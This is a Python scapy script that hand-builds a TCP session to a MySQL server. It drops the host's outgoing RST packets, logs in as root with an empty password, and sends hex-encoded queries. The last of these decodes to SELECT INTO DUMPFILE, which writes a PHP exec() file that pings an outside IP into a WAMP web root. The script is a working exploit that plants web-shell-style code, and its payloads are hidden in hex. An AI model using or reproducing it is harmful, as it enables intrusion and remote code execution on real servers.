from scapy.all import *
import subprocess

RPORT = 3306

def phping_inclusion(RADDR):

    subprocess.run('iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP', shell=True)

    seq,ack = 0,0

    print('> TCP - SYN')
    print('< TCP - SYN/ACK')
    pk_syn = IP(dst=RADDR) / TCP(dport=RPORT, seq=seq ,flags='S')
    pk_synack = sr1(pk_syn, verbose=0)

    seq = pk_synack['TCP'].ack
    ack = pk_synack['TCP'].seq + 1

    print('> TCP - ACK')
    print('< MySQL - Server Greeting')
    pk_ack = IP(dst=RADDR) / TCP(dport=RPORT, seq=seq, ack=ack, flags='A')
    pk_greeting = sr1(pk_ack, verbose=0)

    seq = pk_greeting['TCP'].ack
    ack = pk_greeting['TCP'].seq + len(pk_greeting['TCP'].payload)

    print('> TCP - ACK')
    print('> MySQL - Login Request')
    print('< MySQL - Response OK')
    pk_ack2 = send(IP(dst=RADDR) / TCP(dport=RPORT, seq=seq, ack=ack, flags='A'), verbose=0)

    mysql = bytes.fromhex('3c00000185a6ff2000000001210000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f726400')
    pk_login = IP(dst=RADDR) / TCP(dport=RPORT, seq=seq, ack=ack, flags='PA')
    pk_login = pk_login / Raw(load=mysql)

    pk_ok = sr1(pk_login, verbose=0)

    seq = pk_ok['TCP'].ack
    ack = pk_ok['TCP'].seq + len(pk_ok['TCP'].payload)
    
    print('> MySQL - Request Query')
    print('< MySQL - TABULAR Response')
    mysql = bytes.fromhex('210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031')
    pk_query = IP(dst=RADDR) / TCP(dport=RPORT, seq=seq, ack=ack, flags='PA')
    pk_query = pk_query / Raw(load=mysql)

    pk_tabular = sr1(pk_query, verbose=0)

    seq = pk_tabular['TCP'].ack
    ack = pk_tabular['TCP'].seq + len(pk_tabular['TCP'].payload)
    
    print('> TCP - ACK')
    print('> MySQL - Request Query')
    print('< MySQL - Request OK')
    pk_ack3 = send(IP(dst=RADDR) / TCP(dport=RPORT, seq=seq, ack=ack, flags='A'), verbose=0)

    mysql = bytes.fromhex('500000000353454c45435420273c3f7068702065786563282270696e672039392e39392e39392e35302229203f3e2720494e544f2044554d5046494c452027433a2f77616d702f7777772f70696e672e70687027')
    pk_query2 = IP(dst=RADDR) / TCP(dport=RPORT, seq=seq, ack=ack, flags='PA')
    pk_query2 = pk_query2 / Raw(load=mysql)

    pk_ok2 = sr1(pk_query2, verbose=0)

    seq = pk_ok2['TCP'].ack
    ack = pk_ok2['TCP'].seq + len(pk_ok2['TCP'].payload)

    print('> TCP - ACK')
    print('> MySQL - Request Quit')
    print('< TCP - ACK')
    print('< TCP - FIN/ACK')
    print('> TCP - ACK')
    pk_ack4 = send(IP(dst=RADDR) / TCP(dport=RPORT, seq=seq, ack=ack, flags='A'), verbose=0)

    mysql = bytes.fromhex('0100000001')
    pk_quit = IP(dst=RADDR) / TCP(dport=RPORT, seq=seq, ack=ack, window=8192, flags='FA')
    pk_quit = pk_quit / Raw(load=mysql)
    send(pk_quit, verbose=0)

    ack += 1

    pk_ack5 = send(IP(dst=RADDR) / TCP(dport=RPORT, seq=seq, ack=ack, flags='A'), verbose=0)


